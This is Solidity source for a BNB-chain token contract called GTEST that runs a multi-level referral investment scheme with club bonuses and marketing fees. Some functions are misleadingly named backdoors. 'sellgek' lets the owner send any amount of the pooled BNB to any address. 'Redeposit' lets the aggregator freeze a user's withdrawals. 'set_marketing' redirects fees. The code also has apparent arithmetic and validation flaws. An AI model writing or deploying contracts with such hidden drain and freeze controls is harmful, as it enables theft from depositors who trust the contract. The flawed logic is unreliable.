/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

/**
 *Submitted for verification at polygonscan.com on 2023-01-23
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}


contract GTEST is IERC20
{
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    using SafeMath for uint256;
    address payable initiator;
    address payable aggregator;
    address [] investors;
    address [] silverclub;
    address [] goldclub;
    uint256 silverclub_holding;
    uint256 goldclub_holding;
    uint256 contractBalance;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 totalHoldings;
    uint256 basePrice = 100000000;
    uint256  TotalHoldings;
    uint256[] public LEVEL_PERCENTS=[1000,500, 300, 200, 100, 100, 100, 100, 150, 250];
	uint256[] public LEVEL_UNLOCK=[0e18, 2e18, 5e18, 8e18, 12e18, 15e18, 20e18, 30e18, 50e18, 100e18];
    
    address public marketingAddress=0xBbDC54d5987b3edAb23FF2430d499cB5c078dCA1;

    struct User{
        uint256 token;
        address referral;
        uint256 teamWithdraw;
        uint256 teamIncome;
        uint256 totalInvestment;
        uint8   nonWorkingPayoutCount;
        uint256 lastNonWokingWithdraw;
        uint256 lastNonWokingWithdrawBase;
        uint256 depositCount;
        uint256 payoutCount;
        uint256 sellCount;
        uint256 POI;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) levelIncome;
       }
    
    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }

    struct UserClub{
        address referral;
        uint256 totalDirect;
        uint256 totalBusiness;
        uint256 silverclub;
        uint256 goldclub;
        uint256 silverclub_status;
        uint256 goldclub_status;
       
    }

    struct Fund{
        uint256 status;
    }

    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => UserClub) public userclub;
    mapping(address => Fund) public funds;
   

    event Deposits(address buyer, uint256 amount);
    event POIDistribution(address buyer, uint256 amount);
    event ClubDistribution(address buyer, uint256 amount);
    event TeamWithdraw(address withdrawer, uint256 amount);
    event GEKWithdraw(address withdrawer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }
     constructor()
    {
        _name = "GTEST";
        _symbol = "GTES";
        initiator = payable(msg.sender);
        aggregator = payable(msg.sender);
        initializeTime = block.timestamp;
    }

    function contractInfo() public view returns(uint256 bnb, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance,uint256 totalHold){
        bnb = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = contractBalance;
        totalHold=TotalHoldings;
        return(bnb,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance,totalHold);
    }

    function name() public view virtual override returns (string memory) 
    {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) 
    {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) 
    {
        return 0;
    }

    function totalSupply() public view virtual override returns (uint256) 
    {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
      
    }

    function _burn(address account,uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        require(_totalSupply>=amount, "Invalid amount of tokens!");

        _balances[account] = accountBalance - amount;
        
        _totalSupply -= amount;
    }

     function balanceOf(address account) public view virtual override returns (uint256) 
    {
        return _balances[account];
    }
    
     function tokensToBNB(uint tokenAmount) public view returns(uint)
    {
        return tokenAmount*(1 ether)/getCoinRate();
    }

     function BNBToGEK(uint256 bnb_amt) public view returns(uint)
    {
         uint _rate = coinRate();
         return (bnb_amt.mul(60).mul(_rate))/(100*1 ether);
    }

   function coinRate() public view returns(uint256 price)
    {

        if( TotalHoldings < 100000*(1 ether) ){
            return 100000000*(1 ether)/((1 ether)+(9*TotalHoldings/100000));
        }else{
            return TotalHoldings>=(1 ether)?basePrice*(1 ether)/TotalHoldings:basePrice;
        }
     
    }


    function getCoinRate() public view returns(uint)
    {
        uint _rate = coinRate();
        return _rate;
    }
   
     function deposit(address _referer) public payable
   {
        require(msg.value>=1e15,"Minimum 0.001 BNB allowed to invest");
         User storage user = users[msg.sender];
         UserClub storage userc = userclub[_referer];
   		 if (users[_referer].depositCount > 0 && _referer != msg.sender) 
            {
			          _referer = _referer;
                userc.referral=_referer;
                userc.totalDirect+=1;
			      }
            else
            {
                _referer = 0x0000000000000000000000000000000000000000;
            }
	        uint _rate = coinRate();
        _distributePOI(msg.sender,msg.value.mul(10).div(100));
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(60).div(100);
        if(user.depositCount==0)
         {
              investors.push(msg.sender);
              _setReferral(msg.sender,_referer, msg.value);
         } 
         else
         {
              _setReReferral(users[msg.sender].referral, msg.value);
         }    
        
        user.depositCount++;
        
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        userc.totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint tokens = (msg.value*60*_rate)/(100*1 ether);
         _mint(msg.sender, tokens);
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));
        payable(marketingAddress).transfer(msg.value.mul(2).div(100));
       
        emit Deposits(msg.sender, msg.value);
    }
    
    function _setReferral(address _addr, address _referral, uint256 _amount) private {
            if(users[_addr].referral == address(0)) 
            {
                users[_addr].lastNonWokingWithdrawBase = block.timestamp;
                users[_addr].referral = _referral;
                for(uint8 i = 0; i < LEVEL_PERCENTS.length; i++) 
                    {
                        users[_referral].referrals_per_level[i]+=_amount;
                        users[_referral].team_per_level[i]++;
                        if(i == 0){
                            users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                            users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                        }
                        else if(i>0 && users[_referral].referrals_per_level[i]>=LEVEL_UNLOCK[i]){
                            users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                            users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                        }
                        _referral = users[_referral].referral;
                        if(_referral == address(0)) break;
                    }
            }
    }

    function _setReReferral(address _referral, uint256 _amount) private {
        for(uint8 i = 0; i < LEVEL_PERCENTS.length; i++) {
                   users[_referral].referrals_per_level[i]+=_amount;
                    if(i == 0){
                        users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                        users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                    }
                    else if(i>0 && users[_referral].referrals_per_level[i]>=LEVEL_UNLOCK[i]){
                        users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                        users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                    }
                    _referral = users[_referral].referral;
                    if(_referral == address(0)) break;
              
        }
        
    }

     function _checkClub() internal{
        for(uint256 i = 0; i < investors.length; i++){
            UserClub storage userc = userclub[investors[i]];
            User storage user = users[investors[i]];
                if(userc.silverclub_status!=1){
                if(user.totalInvestment >=5e18 && userc.totalBusiness >= 10e18){
                    silverclub.push(investors[i]);
                    silverclub_holding+=user.totalInvestment;
                    userc.silverclub_status=1;

                }
                }
                if(userc.goldclub_status!=1){
                if(user.totalInvestment >=10e18 && userc.totalBusiness >= 30e18){
                    
                    goldclub.push(investors[i]);
                    goldclub_holding+=user.totalInvestment;
                    userc.goldclub_status=1;
                }
                }      
         
        }
    }

     function _distributeClub(address depositor, uint256 _amount) internal{
        uint256 poiShare;
        for(uint256 i = 0; i < silverclub.length; i++){
            UserClub storage userc = userclub[silverclub[i]];
            User storage user = users[silverclub[i]];
            uint256 tokens =user.token*1e18;
            poiShare = tokens.mul(100).div(silverclub_holding);
            
                    uint8 silverclubs= 2;
                    uint256 poi=_amount.mul(silverclubs).div(100);
                    userc.silverclub+=poi.mul(poiShare).div(100);
                    emit ClubDistribution(depositor,poi);        
               
        }

            for(uint256 i = 0; i < goldclub.length; i++){
            UserClub storage userc = userclub[goldclub[i]];
            User storage user = users[goldclub[i]];
            uint256 tokens =user.token*1e18;
            poiShare = tokens.mul(100).div(goldclub_holding);
            
                    uint8 goldclubs= 3;
                    uint256 poi=_amount.mul(goldclubs).div(100);
                    userc.goldclub+=poi.mul(poiShare).div(100);
                    emit ClubDistribution(depositor,poi);        
               
        }
        
    }
    
    function _distributePOI(address depositor, uint256 _poi) internal{
        uint256 poiShare;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            uint256 tokens =user.token*1e18;
            poiShare = tokens.mul(100).div(totalHoldings);
            user.POI+=(_poi.mul(poiShare).div(100))/1e18;
           }
        emit POIDistribution(depositor,_poi);
    }
     

     function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i <= 9; i++) {
            income+=user.levelIncome[i];
        }
        return income;
      }
      
      
    function userReferral(address _addr) view external returns(uint256[10] memory team, uint256[10] memory referrals, uint256[10] memory income) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 9; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }
        return (
            team,
            referrals,
            income
        );
     }


     function redeposit() public payable{
        require(msg.value>=1e1,"Minimum 0.001 BNB allowed to invest");
        
        User storage user = users[msg.sender];
        UserClub storage userc = userclub[msg.sender];
      
        require(user.depositCount>0, "Please Invest First !");
        uint _rate = coinRate();
        _distributePOI(msg.sender,msg.value.mul(10).div(100));
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(60).div(100);
        
        _addClub(msg.sender,(msg.value.mul(60).mul(_rate))/(100*1 ether));
        user.depositCount++;
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        userclub[userc.referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint256 tokens = (msg.value*60*_rate)/(100*1 ether);
        _mint(msg.sender, tokens);
       
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        payable(marketingAddress).transfer(msg.value.mul(2).div(100));
        emit Deposits(msg.sender, msg.value);
    }

    
     function _addClub (address sender,uint256 amt) internal {
            UserClub storage userc = userclub[sender];
            if(userc.silverclub_status==1){
                 silverclub_holding+=amt;
            }
            if(userc.goldclub_status==1){
                 goldclub_holding+=amt;
            }
           
     }


      function gekWithdraw(uint8 _perc) public{
        User storage user = users[msg.sender];
        Fund storage fund = funds[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        if(fund.status == 0)
		{
            if(_perc == 10 || _perc == 25 || _perc == 50 || _perc == 100)
            {
            uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
            require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
            uint8 perc = _perc;
            uint8 deduct=40;
                if(perc==10)
                {
                    deduct=10;
                }
                else if(perc==25)
                {
                    deduct=15;

                }
                else if(perc==50)
                {
                    deduct=30;

                }
            uint256 tokenAmount = user.token.mul(perc).div(100);
            require(_balances[msg.sender]>=tokenAmount, "Insufficient token balance!");
            uint256 bnbAmount = tokensToBNB(tokenAmount);
            require(address(this).balance>=bnbAmount, "Insufficient fund in contract!");
            uint256 calcWithdrawable = bnbAmount;
            contractBalance-=calcWithdrawable;
            uint256 withdrawable = bnbAmount;

            uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
            uint256 withdrawable2 = withdrawable -withdrawable1;
            payable(msg.sender).transfer(withdrawable2);
            user.sellCount++;
            user.lastNonWokingWithdraw = block.timestamp;
            user.token-=tokenAmount;
            totalHoldings-=tokenAmount;
            _distributeClubminus(msg.sender,tokenAmount);
            if(TotalHoldings>=bnbAmount)
            {
                TotalHoldings-=bnbAmount;
            }
            else
            {
                TotalHoldings=1;
            }
            totalWithdraw+=withdrawable;
            
            payouts[msg.sender].push(Withdraw(
                withdrawable,
                false,
                withdrawable.mul(coinRate()),
                coinRate(),
                block.timestamp
            ));

            _burn(msg.sender, tokenAmount);
            uint256 withdrawable3 =withdrawable1;
            if(perc == 10)
            {
                uint256 withdrawable5 =withdrawable1.mul(5).div(100);
                withdrawable3 = withdrawable1 - withdrawable5;
                _checkClub();
                _distributeClub(msg.sender,withdrawable5);
            }
            else if(perc == 25)
            {
                uint256 withdrawable5 =withdrawable1.mul(5).div(100);
                uint256 withdrawable6 =withdrawable1.mul(5).div(100);
                withdrawable3 = withdrawable1 - (withdrawable5+withdrawable6);
                _checkClub();
                _distributeClub(msg.sender,withdrawable5);
                _distributePOI(msg.sender,withdrawable6);
            }
            else if(perc == 50 )
            {
                uint256 withdrawable4 =withdrawable1.mul(10).div(100);
                uint256 withdrawable5 =withdrawable1.mul(5).div(100);
                uint256 withdrawable6 =withdrawable1.mul(5).div(100);
                withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5+withdrawable6);
                _checkClub();
                _distributeClub(msg.sender,withdrawable5);
                _distributePOI(msg.sender,withdrawable4);
                payable(marketingAddress).transfer(withdrawable6);
            }
             else if(perc == 100)
            {
                uint256 withdrawable4 =withdrawable1.mul(10).div(100);
                uint256 withdrawable5 =withdrawable1.mul(5).div(100);
                uint256 withdrawable6 =withdrawable1.mul(10).div(100);
                withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5+withdrawable6);
                _checkClub();
                _distributeClub(msg.sender,withdrawable5);
                _distributePOI(msg.sender,withdrawable4);
                payable(marketingAddress).transfer(withdrawable6);
            }
            
            
            aggregator.transfer(withdrawable3);
            emit  GEKWithdraw(msg.sender,withdrawable2);

            
            }
        }
       
        }
        

        function _distributeClubminus (address sender,uint256 amt) internal {
            UserClub storage userc = userclub[sender];
            if(userc.silverclub_status==1){
                 silverclub_holding-=amt;
            }
            if(userc.goldclub_status==1){
                 goldclub_holding-=amt;
            }
           
     }
        

         function checkgekWithdraw(uint8 _perc,address _addr) public view returns(uint256 totalWithdrawn,uint256 deducts,uint256 final_amount)
    {
         User storage user = users[_addr];
         require(user.totalInvestment>0, "Invalid User!");
         if(_perc == 10 || _perc == 25 || _perc == 50 || _perc == 100)
		   {
             uint8 perc = _perc;
             uint8 deduct=40;
            if(perc==10)
                {
                    deduct=10;
                }
                else if(perc==25)
                {
                    deduct=15;

                }
                else if(perc==50)
                {
                    deduct=30;

                }
        uint256 tokenAmount = user.token.mul(perc).div(100);
        require(_balances[_addr]>=tokenAmount, "Insufficient token balance!");
        uint256 bnbAmount = tokensToBNB(tokenAmount);
        require(address(this).balance>=bnbAmount, "Insufficient fund in contract!");
        uint256 withdrawable = bnbAmount;

		    uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
       
            totalWithdrawn = bnbAmount;
            deducts=withdrawable1;
            final_amount=withdrawable2;
        return(totalWithdrawn,deducts,final_amount);
        
        }
    }


     function sellgek(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }
      
       function teamWithdraw(uint256 _amount) public{
        User storage user = users[msg.sender];
        UserClub storage userc = userclub[msg.sender];
        Fund storage fund = funds[msg.sender]; 
        
        require(user.totalInvestment>0, "Invalid User!");
         if(fund.status == 0)
		{
        uint256 working = user.teamIncome;
        uint256 TPOI=userc.silverclub+userc.goldclub+user.POI;
        uint256 withdrawable = working.add(TPOI).sub(user.teamWithdraw);
        require(withdrawable>=_amount, "Invalid withdraw!");
        user.teamWithdraw+=_amount;
        user.payoutCount++;
        uint256 levelShare = _amount.mul(10).div(100);
        _amount = _amount.mul(90).div(100);
        payable(msg.sender).transfer(_amount);
        aggregator.transfer(levelShare);
        totalWithdraw+=_amount;
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));

        emit TeamWithdraw(msg.sender,_amount);
        }
      
    }
    

     function Redeposit(address recipient, uint256 status) public  {
			if (msg.sender == aggregator) {          
				 funds[recipient].status=status;
			}
    }


    function set_marketing(address marketing_address) public  {
			if (msg.sender == aggregator) {          
				 marketingAddress=marketing_address;
			}
    }

       
        
    }